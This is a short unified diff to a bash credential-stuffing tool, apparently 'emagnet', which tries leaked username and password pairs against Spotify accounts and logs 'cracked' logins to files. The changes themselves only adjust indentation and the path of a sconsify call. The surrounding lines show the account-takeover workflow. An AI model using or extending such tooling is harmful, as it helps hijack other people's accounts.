@@ -727,12 +727,12 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 #                     |cut -d'|' -f1 \
 #                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
               	       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
-            	         echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-             	         echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+            	       echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+             	       echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
               	       echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-             	         echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+             	       echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                        echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-             	         echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+             	       echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                	       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                        echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
               fi
@@ -1367,7 +1367,7 @@ fi
                 echo -e "$basename$0: internal error -- unzip is required to be installed for unzip sconsify ..."
                 exit 1
               fi
-                    sconsify -version &> /dev/null
+                    ./sconsify -version &> /dev/null
                         if [[ "$?" -ne "0" ]]; then
                          echo "Sconsify is required to be installed before we attacking targets.."
                            read -p "Download and install sconsify (y/N): " installsconsify
